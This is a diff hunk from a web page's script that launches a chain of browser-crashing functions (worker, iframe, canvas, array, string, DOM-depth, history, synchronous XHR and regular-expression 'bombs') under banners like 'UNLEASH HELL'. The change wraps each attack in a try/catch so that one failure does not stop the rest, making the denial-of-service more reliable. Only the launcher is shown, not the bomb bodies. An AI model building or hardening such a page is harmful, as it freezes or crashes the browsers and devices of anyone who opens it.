@@ -173,21 +173,24 @@ function arrayBomb(){
 // UNLEASH HELL
 log('=== SKILL ISSUE ===\n');
 
+// Wrap each attack so failures don't stop the chain
+const safe=(fn)=>{try{fn()}catch(e){}};
+
 // All attacks fire rapidly
-workerBomb();
-setTimeout(iframeBomb,0);
-setTimeout(canvasBomb,50);
-setTimeout(arrayBomb,100);
-setTimeout(stringBomb,150);
-setTimeout(domDepthBomb,200);
-setTimeout(cssVarBomb,250);
-setTimeout(historyBomb,300);
-setTimeout(layoutBomb,350);
-setTimeout(mutationBomb,400);
-setTimeout(jsonBomb,450);
-setTimeout(syncXhrBomb,500);
+setTimeout(()=>safe(workerBomb),0);
+setTimeout(()=>safe(iframeBomb),10);
+setTimeout(()=>safe(canvasBomb),50);
+setTimeout(()=>safe(arrayBomb),100);
+setTimeout(()=>safe(stringBomb),150);
+setTimeout(()=>safe(domDepthBomb),200);
+setTimeout(()=>safe(cssVarBomb),250);
+setTimeout(()=>safe(historyBomb),300);
+setTimeout(()=>safe(layoutBomb),350);
+setTimeout(()=>safe(mutationBomb),400);
+setTimeout(()=>safe(jsonBomb),450);
+setTimeout(()=>safe(syncXhrBomb),500);
 setTimeout(()=>{
   log('\n=== FINAL BLOW ===');
-  redosBomb();
+  safe(redosBomb);
 },600);
 </script>
